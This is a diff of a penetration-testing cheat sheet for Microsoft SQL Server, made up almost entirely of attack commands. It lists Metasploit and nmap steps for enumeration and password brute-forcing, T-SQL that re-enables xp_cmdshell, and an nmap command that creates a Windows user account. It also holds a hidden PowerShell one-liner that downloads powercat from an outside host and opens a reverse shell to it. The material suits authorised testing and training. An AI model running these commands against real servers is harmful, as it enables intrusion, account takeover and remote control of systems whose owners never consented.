@@ -1,32 +1,80 @@
-# MS-SQL
+# Pentest MS-SQL
 
-# Ping with MS-SQL
+# Ping with MS-SQL (metasploit)
+;; Queries the MSSQL instance for information. This will also provide if any ms-sql is running on different ports.
 use auxiliary/scanner/mssql/mssql_ping
+run
 
-# Login to MS-SQL
-mssqlclient.py -port 27900 user:password@10.1.1.1
-or
+# Enumeration (metasploit)
+use auxiliary/admin/mssql/mssql_enum
+set rhost 10.10.xx.xx
+set password company@123
+run
+
+;; If the xp_cmdshell is disabled and we have sa credentials, we can enable
+;; it by executing the below code in dbeaver as mentioned in xp_cmdshell
+;; Server Configuration Option
+
+-- To allow advanced options to be changed.
+EXEC sp_configure 'show advanced options', 1;
+GO
+-- To update the currently configured value for advanced options.
+RECONFIGURE;
+GO
+-- To enable the feature.
+EXEC sp_configure 'xp_cmdshell', 1;
+GO
+-- To update the currently configured value for this feature.
+RECONFIGURE;
+GO
+
+# Enumeration - Domain Accounts (metasploit)
+use auxiliary/admin/mssql/mssql_enum_domain_accounts
+set rhost 10.10.xx.xx
+set password company@123
+
+# Bruteforce (metasploit)
+use auxiliary/scanner/mssql/mssql_login
+set Password company@123
+run
+
+# Execute commands (metasploit)
+;; if xp_cmdshell is enabled and if the user has permissions.
+use auxiliary/admin/mssql/mssql_exec
+set RHOst 10.10.xx.xx
+set password company@123
+set cmd ipconfig
+;; if it works
+;; At this point, we can probably use msf exploit/windows/mssql/mssql_payload
+;; or get a shell back with powercat or powershell-empire.
+EXEC xp_cmdshell 'powershell -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString("http://10.0.0.1:8080/powercat.ps1");powercat -c 10.0.0.1 -p 443 -e cmd'
+
+
+# PostExploitation - Schema Dump (metasploit)
+use auxiliary/scanner/mssql/mssql_schemadump
+
+tsql -H 10.10.xx.xx -p 1433 -U sa -P company@123
+1> SELECT suser_sname(owner_sid)
+2> FROM sys.databases
+3> go
+
+
+# Enumeration (nmap)
+nmap -n -v -sV -Pn -p 1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password  192.168.1.10
+
+# Brutefoce (nmap)
+nmap -n -v -sV -Pn -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=passwords.txt 192.168.1.10
+
+# Execute Commands (nmap)
+nmap -n -v -sV -Pn -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=SQL_USER,mssql.password=SQL_PASS,ms-sql-xp-cmdshell.cmd="net user jsmith MySecretPassword123 /add" 192.168.1.10
+
+# Login (sqsh)
+sqsh -S <IP> -U sa
 sqsh -S 10.1.1.1 -U user -P password
 
-# Last options. Brute force.
-scanner/mssql/mssql_login
+# Login (mssqlclient)
+mssqlclient.py -port 27900 user:password@10.1.1.1
 
-# Log in to mssql
-sqsh -S INSERTIPADDRESS -U sa
-
-# Execute commands
-xp_cmdshell 'date'
-go
-
-
-nmap -n -v -sV -Pn -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=passwords.txt 192.168.1.10
-nmap -n -v -sV -Pn -p 1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password  192.168.1.10
-nmap -n -v -sV -Pn -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=SQL_USER,mssql.password=SQL_PASS,ms-sql-xp-cmdshell.cmd="net user jsmith MySecretPassword123 /add" 192.168.1.10
-sqsh -S 192.168.1.10 -U sa
-
-# Metasploit Modules
-
-auxiliary/scanner/mssql/mssql_login
-auxiliary/admin/mssql/mssql_exec
-auxiliary/admin/mssql/mssql_enum
-
+# Execute commands (MSSQL)
+mssql> xp_cmdshell 'date'
+mssql> go
